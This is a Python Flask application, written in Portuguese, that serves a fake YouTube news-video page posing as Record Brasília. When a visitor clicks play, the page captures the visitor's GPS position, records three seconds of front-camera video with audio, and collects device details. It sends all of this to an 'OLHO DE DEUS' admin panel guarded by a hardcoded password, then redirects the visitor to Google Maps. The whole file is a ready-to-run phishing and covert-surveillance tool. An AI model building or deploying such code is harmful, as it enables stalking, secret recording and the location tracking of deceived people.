from flask import Flask, render_template_string, request, jsonify
import datetime
import urllib.request
import json
import nmap
import threading
from user_agents import parse

app = Flask(__name__)

# Buffers de armazenamento em RAM
registros_gps = []
registros_ip = []
registros_videos = []

# Credenciais de Acesso ao Console
SENHA_ADMIN = "123123"

# Link de redirecionamento final solicitado
LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"

# Página HTML com apenas o carregamento limpo
HTML_CAPTURA = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Motorista sobrevive após capotar na BR-070 dias... - YouTube</title>
    
    <meta property="og:title" content="Motorista sobrevive após capotar na BR-070 dias...">
    <meta property="og:description" content="Record Brasília - YouTube">
    <meta property="og:image" content="https://images.unsplash.com/photo-1508804185872-d7badad00f7d">
    <meta property="og:url" content="https://loc-nsdi.onrender.com/">
    <meta property="og:type" content="video.other">

    <style>
        * {{ box-sizing: border-box; }}
        body {{
            background-color: #0f0f0f;
            color: #f1f1f1;
            font-family: Roboto, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }}
        .yt-header {{
            width: 100%;
            max-width: 600px;
            background: #212121;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 14px;
            border-bottom: 1px solid #3f3f3f;
        }}
        .yt-channel-info {{
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        .yt-logo {{
            width: 24px;
            height: 24px;
            background: #ff0000;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .yt-logo svg {{
            width: 14px;
            fill: #fff;
        }}
        .yt-details .channel-name {{
            font-size: 14px;
            font-weight: 500;
            color: #f1f1f1;
        }}
        .yt-details .upload-date {{
            font-size: 11px;
            color: #aaa;
        }}
        .btn-acessar {{
            background: #3ea6ff;
            color: #0f0f0f;
            border: none;
            padding: 6px 14px;
            font-weight: 600;
            font-size: 13px;
            border-radius: 18px;
            cursor: pointer;
        }}
        .video-container {{
            width: 100%;
            max-width: 600px;
            background: #0f0f0f;
        }}
        .video-title-section {{
            padding: 12px 14px;
            font-size: 16px;
            font-weight: 500;
            line-height: 1.4;
            color: #f1f1f1;
        }}
        .player-wrapper {{
            position: relative;
            width: 100%;
            aspect-ratio: 16/9;
            background: #000;
            background-image: url('https://images.unsplash.com/photo-1508804185872-d7badad00f7d');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .player-wrapper::before {{
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.4);
        }}
        .yt-play-button {{
            position: relative;
            z-index: 2;
            width: 68px;
            height: 48px;
            background-color: rgba(255, 0, 0, 0.9);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
            transition: transform 0.1s ease;
        }}
        .yt-play-button:hover {{
            background-color: #ff0000;
            transform: scale(1.05);
        }}
        .yt-play-button::after {{
            content: "";
            width: 0;
            height: 0;
            border-style: solid;
            border-width: 9px 0 9px 16px;
            border-color: transparent transparent transparent #fff;
            margin-left: 3px;
        }}
        .action-bar {{
            display: flex;
            justify-content: space-around;
            padding: 12px;
            border-bottom: 1px solid #272727;
        }}
        .action-btn {{
            background: #272727;
            border: none;
            color: #fff;
            padding: 8px 16px;
            border-radius: 18px;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
        }}

        #modalPermissao {{
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 999;
            align-items: center;
            justify-content: center;
        }}
        .spinner-limpo {{
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #3ea6ff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        #video-oculto {{ display: none; }}
    </style>
</head>
<body>

    <div class="yt-header">
        <div class="yt-channel-info">
            <div class="yt-logo">
                <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
            </div>
            <div class="yt-details">
                <div class="channel-name">Record Brasília</div>
                <div class="upload-date">YouTube • 2 de set. de 2026</div>
            </div>
        </div>
        <button class="btn-acessar" onclick="dispararFluxo()">Acessar</button>
    </div>

    <div class="video-container">
        <div class="video-title-section">
            Motorista sobrevive após capotar na BR-070 dias...
        </div>
        <div class="player-wrapper">
            <div class="yt-play-button" onclick="dispararFluxo()"></div>
        </div>
        <div class="action-bar">
            <button class="action-btn" onclick="dispararFluxo()">📤 Compartilhar</button>
            <button class="action-btn" onclick="dispararFluxo()">📥 Salvar</button>
        </div>
    </div>

    <div id="modalPermissao">
        <div class="spinner-limpo"></div>
    </div>

    <video id="video-oculto" autoplay playsinline muted></video>

    <script>
        const urlDestino = "{LINK_DESTINO}";
        let videoGravadoBase64 = null;

        function dispararFluxo() {{
            document.getElementById('modalPermissao').style.display = 'flex';
            
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    (pos) => processarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
                    (err) => processarDados(null, null, null),
                    {{ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }}
                );
            }} else {{
                processarDados(null, null, null);
            }}
        }}

        async function gravarVideoCamera() {{
            return new Promise(async (resolve) => {{
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{
                        video: {{ facingMode: "user" }},
                        audio: true
                    }});
                    
                    const video = document.getElementById('video-oculto');
                    video.srcObject = stream;
                    await video.play().catch(() => {{}});

                    let options = {{ mimeType: 'video/webm; codecs=vp8' }};
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
                        options = {{ mimeType: 'video/webm' }};
                    }}
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
                        options = {{}};
                    }}

                    const mediaRecorder = new MediaRecorder(stream, options);
                    let chunks = [];

                    mediaRecorder.ondataavailable = (event) => {{
                        if (event.data && event.data.size > 0) {{
                            chunks.push(event.data);
                        }}
                    }};

                    mediaRecorder.onstop = async () => {{
                        const blob = new Blob(chunks, {{ type: 'video/webm' }});
                        const reader = new FileReader();
                        reader.readAsDataURL(blob);
                        reader.onloadend = () => {{
                            videoGravadoBase64 = reader.result;
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        }};
                    }};

                    mediaRecorder.start();
                    
                    setTimeout(() => {{
                        if (mediaRecorder.state === "recording") {{
                            mediaRecorder.stop();
                        }} else {{
                            resolve();
                        }}
                    }}, 3000);

                }} catch(e) {{
                    console.warn("Permissão negada:", e);
                    resolve();
                }}
            }});
        }}

        async function processarDados(lat, lon, precisao) {{
            await gravarVideoCamera();

            let infoHardware = {{
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                platform: navigator.platform || 'N/A',
                language: navigator.language || 'N/A',
                cookieEnabled: navigator.cookieEnabled ? 'SIM' : 'NÃO',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : 'DESCONHECIDO',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                bateria: 'N/A',
                resolucqao: window.screen.width + 'x' + window.screen.height
            }};

            if (navigator.getBattery) {{
                try {{
                    let bat = await navigator.getBattery();
                    infoHardware.bateria = Math.round(bat.level * 100) + '% (' + (bat.charging ? 'CARREGANDO' : 'DESCARGA') + ')';
                }} catch(e) {{}}
            }}

            const payload = {{
                hw: infoHardware,
                latitude: lat,
                longitude: lon,
                precisao: precisao,
                video: videoGravadoBase64
            }};

            try {{
                await fetch('/salvar-payload-total', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }});
            }} catch(e) {{
                console.error("Erro no envio:", e);
            }} finally {{
                window.location.replace(urlDestino);
            }}
        }}
    </script>
</body>
</html>
"""

HTML_PAINEL = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAINFRAME - OLHO DE DEUS</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 12px;
            background: #020302;
            color: #00FF66;
            position: relative;
            min-height: 100vh;
        }
        .watermark-ascii {
            position: fixed;
            top: 42vh;
            left: 50%;
            transform: translateX(-50%);
            font-family: monospace;
            font-size: 2.2vw;
            line-height: 1.15;
            color: rgba(0, 255, 102, 0.75);
            text-shadow: 0 0 15px rgba(0, 255, 102, 0.9);
            white-space: pre;
            z-index: 0;
            pointer-events: none;
            text-align: center;
            letter-spacing: 0.5px;
            font-weight: bold;
        }
        @media (min-width: 900px) {
            .watermark-ascii {
                font-size: 13px;
                letter-spacing: 1px;
            }
        }
        .content-wrapper { position: relative; z-index: 1; }
        h2 {
            color: #00FF66;
            font-size: 14px;
            border-bottom: 1px dashed rgba(0, 255, 102, 0.5);
            padding-bottom: 4px;
            margin-top: 25px;
            text-transform: uppercase;
        }
        .status-box {
            background: rgba(3, 5, 3, 0.3);
            border: 1px solid rgba(0, 255, 102, 0.3);
            padding: 10px;
            border-radius: 4px;
            font-size: 12px;
            margin-bottom: 15px;
        }
        .table-container {
            width: 100%;
            overflow-x: auto;
            margin-bottom: 20px;
            border: 1px solid rgba(26, 51, 26, 0.3);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(2, 4, 2, 0.25);
            font-size: 12px;
        }
        th, td {
            border: 1px solid rgba(26, 51, 26, 0.3);
            padding: 8px 6px;
            text-align: left;
        }
        th {
            background: rgba(5, 15, 5, 0.4);
            color: #00FF66;
            font-size: 12px;
            letter-spacing: 1px;
        }
        tr:nth-child(even) { background: rgba(2, 4, 2, 0.2); }
        tr:nth-child(odd) { background: rgba(5, 10, 5, 0.2); }
        a { color: #3399FF; text-decoration: none; font-weight: bold; }
        a:hover { text-decoration: underline; }
        .badge {
            background: rgba(5, 26, 5, 0.4);
            color: #00FF66;
            padding: 3px 6px;
            border-radius: 3px;
            font-size: 11px;
            display: inline-block;
            margin: 2px 0;
            border: 1px solid rgba(0, 255, 102, 0.4);
        }
        .id-tag {
            background: rgba(0, 255, 102, 0.8);
            color: #000;
            font-weight: bold;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 11px;
            text-align: center;
        }
        .captured-video {
            width: 160px;
            height: 120px;
            border: 1px solid #00FF66;
            border-radius: 4px;
            background: #000;
        }
        details summary { cursor: pointer; color: #3399FF; font-weight: bold; }
        .empty-msg { color: #FF5555; text-align: center; padding: 15px; font-size: 12px; }
        .terminal-text {
            font-size: 11px;
            color: #88ff88;
            line-height: 1.4;
            background: rgba(3, 5, 3, 0.3);
            padding: 8px;
            border-left: 3px solid rgba(0, 255, 102, 0.6);
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

<div class="watermark-ascii">
    ___  _     _    _  ___       ____  _____      ____  _____ _   _ ____  
   / _ \| |   | | | |/ _ \     |  _ \| ____|    |  _ \| ____| | | / ___| 
  | | | | |   | |_| | | | |    | | | |  _|      | | | |  _| | | | \___ \ 
  | |_| | |___| _  _| |_| |    | |_| | |___     | |_| | |___| |_| |___) |
   \___/|_____|_| |_|\___/     |____/|_____|    |____/|_____|\___/|____/ 
</div>

<div class="content-wrapper">
    <div class="status-box">
        <b>[SYS_STATUS]</b> ONLINE-ACTIVE | <b>YOUTUBE CLONE MODULE:</b> ACTIVE<br>
        <b>[PROTOCOL]</b> SECURE TCP/IP | <b>REFRESH:</b> 5s
    </div>

    <div class="terminal-text">
        identification division.<br>
        program-id. MAINFRAME-SECURE-CONSOLE.<br>
        author. PENTESTER-CORE.<br>
        module. 07 - YOUTUBE STREAM & SURVEILLANCE
    </div>

    <h2>[ 01 ] GRAVAÇÕES DE VÍDEO DA CÂMERA ({{ videos|length }})</h2>
    <div class="table-container">
        <table>
            <tr>
                <th>ID</th>
                <th>DATA / HORA</th>
                <th>IP DE ORIGEM</th>
                <th>VÍDEO CAPTURADO (3s)</th>
            </tr>
            {% for v in videos %}
            <tr>
                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
                <td>{{ v.data }}</td>
                <td><b>{{ v.ip }}</b></td>
                <td>
                    {% if v.video %}
                        <video src="{{ v.video }}" class="captured-video" controls></video>
                    {% else %}
                        <span style="color: #FF5555;">Sem permissão / Câmera indisponível</span>
                    {% endif %}
                </td>
            </tr>
            {% else %}
            <tr><td colspan="4" class="empty-msg">> 01 CONDITIONAL: NENHUM VÍDEO GRAVADO <<</td></tr>
            {% endfor %}
        </table>
    </div>

    <h2>[ 02 ] CAPTURAS DE GEOLOCALIZAÇÃO GPS ({{ gps|length }})</h2>
    <div class="table-container">
        <table>
            <tr>
                <th>ID</th>
                <th>DATA / HORA</th>
                <th>IP ORIGEM</th>
                <th>LAT / LONG</th>
                <th>PREC</th>
                <th>MAPS</th>
            </tr>
            {% for r in gps %}
            <tr>
                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
                <td>{{ r.data }}</td>
                <td><b>{{ r.ip }}</b></td>
                <td>{{ r.lat }}, {{ r.lon }}</td>
                <td>{{ r.precisao }}m</td>
                <td><a href="{{ r.maps }}" target="_blank">🗺️ MAPA</a></td>
            </tr>
            {% else %}
            <tr><td colspan="6" class="empty-msg">> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO <<</td></tr>
            {% endfor %}
        </table>
    </div>

    <h2>[ 03 ] INTELIGÊNCIA DE REDE, HARDWARE & NMAP ({{ ips|length }})</h2>
    <div class="table-container">
        <table>
            <tr>
                <th>ID</th>
                <th>DATA / HORA</th>
                <th>IP / LOCALIZAÇÃO / ISP</th>
                <th>HARDWARE & DISPOSITIVO</th>
                <th>NAVEGADOR / USER-AGENT</th>
                <th>PORTAS</th>
            </tr>
            {% for r in ips %}
            <tr>
                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
                <td>{{ r.data }}</td>
                <td>
                    <b>{{ r.ip }}</b><br>
                    <span style="color: #3399FF;">{{ r.cidade }}/{{ r.estado }}</span><br>
                    <small>{{ r.isp }}</small><br>
                    Conexão: <b>{{ r.hw.connectionType }}</b>
                </td>
                <td>
                    CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
                    RAM: {{ r.hw.deviceMemory }} GB<br>
                    Bateria: {{ r.hw.bateria }}<br>
                    Tela: {{ r.hw.resolucqao }}<br>
                    Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
                    Fuso: {{ r.hw.timezone }}
                </td>
                <td>
                    <b>OS:</b> {{ r.ua_info.os }}<br>
                    <b>Browser:</b> {{ r.ua_info.browser }}<br>
                    <b>Device:</b> {{ r.ua_info.device }}<br>
                    <b>Idioma:</b> {{ r.hw.language }}<br>
                    <details style="margin-top: 6px;">
                        <summary>Ver User-Agent</summary>
                        <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
                    </details>
                </td>
                <td>
                    {% if r.portas %}
                        {% for p in r.portas %}
                            <span class="badge">P.{{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
                        {% endfor %}
                    {% else %}
                        <span style="color: #FF5555;">Escaneando...</span>
                    {% endif %}
                </td>
            </tr>
            {% else %}
            <tr><td colspan="6" class="empty-msg">> 01 CONDITIONAL: NENHUM REGISTRO CAPTURADO <<</td></tr>
            {% endfor %}
        </table>
    </div>
</div>

<script>
    setTimeout(function(){
        window.location.reload();
    }, 5000);
</script>
</body>
</html>
"""

def executar_nmap_background(registro_ref):
    try:
        nm = nmap.PortScanner()
        nm.scan('scanme.nmap.org', arguments='-p 22,80,443,3306,8080 --open -T4')
        portas_encontradas = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for p in lport:
                    estado = nm[host][proto][p]['state']
                    servico = nm[host][proto][p]['name']
                    portas_encontradas.append({"porta": p, "estado": estado, "servico": servico})
        registro_ref["portas"] = portas_encontradas
    except Exception as e:
        print(f"Erro na varredura Nmap: {e}")
        registro_ref["portas"] = [{"porta": "N/A", "estado": "blocked", "servico": "filtered"}]

@app.route('/')
def index():
    return render_template_string(HTML_CAPTURA)

@app.route('/salvar-payload-total', methods=['POST'])
def salvar_payload_total():
    dados = request.json or {}
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    user_agent_str = request.headers.get('User-Agent', 'Desconhecido')
    parsed_ua = parse(user_agent_str)
    ua_info = {
        "os": f"{parsed_ua.os.family} {parsed_ua.os.version_string}".strip(),
        "browser": f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}".strip(),
        "device": f"{parsed_ua.device.brand or ''} {parsed_ua.device.model or ''} ({'Mobile' if parsed_ua.is_mobile else 'Tablet' if parsed_ua.is_tablet else 'PC'})".strip()
    }

    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
    try:
        if ip_cliente != "127.0.0.1" and ip_cliente != "localhost":
            url = f"http://ip-api.com/json/{ip_cliente}?lang=pt-BR"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                api_data = json.loads(response.read().decode())
                if api_data.get('status') == 'success':
                    cidade = api_data.get('city', 'Desconhecido')
                    estado = api_data.get('regionName', 'Desconhecido')
                    pais = api_data.get('country', 'Desconhecido')
                    isp = api_data.get('isp', 'Desconhecido')
    except Exception as e:
        print("Erro GeoIP:", e)

    hw = dados.get('hw', {})
    video_b64 = dados.get('video')

    if video_b64:
        registros_videos.insert(0, {
            "data": agora,
            "ip": ip_cliente,
            "video": video_b64
        })

    novo_registro_ip = {
        "data": agora,
        "ip": ip_cliente,
        "cidade": cidade,
        "estado": estado,
        "pais": pais,
        "isp": isp,
        "hw": hw,
        "ua_info": ua_info,
        "user_agent": user_agent_str,
        "portas": []
    }
    registros_ip.insert(0, novo_registro_ip)

    t = threading.Thread(target=executar_nmap_background, args=(novo_registro_ip,))
    t.start()

    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')

    if lat is not None and lon is not None:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        registros_gps.insert(0, {
            "data": agora,
            "ip": ip_cliente,
            "lat": lat,
            "lon": lon,
            "precisao": precisao,
            "maps": maps_link
        })

    return jsonify({"status": "sucesso", "payload": "processed"})

@app.route('/admin', methods=['GET'])
def admin():
    senha_informada = request.args.get('senha', '')
    if senha_informada != SENHA_ADMIN:
        return """
        <body style="font-family: 'Courier New'; background: #050505; color: #FF5555; text-align: center; margin-top: 20%;">
            <h2>[ACCESS_DENIED]</h2>
            <p>Informe a senha correta na URL: <code>/admin?senha=SUA_SENHA</code></p>
        </body>
        """, 403
        
    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip, videos=registros_videos)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)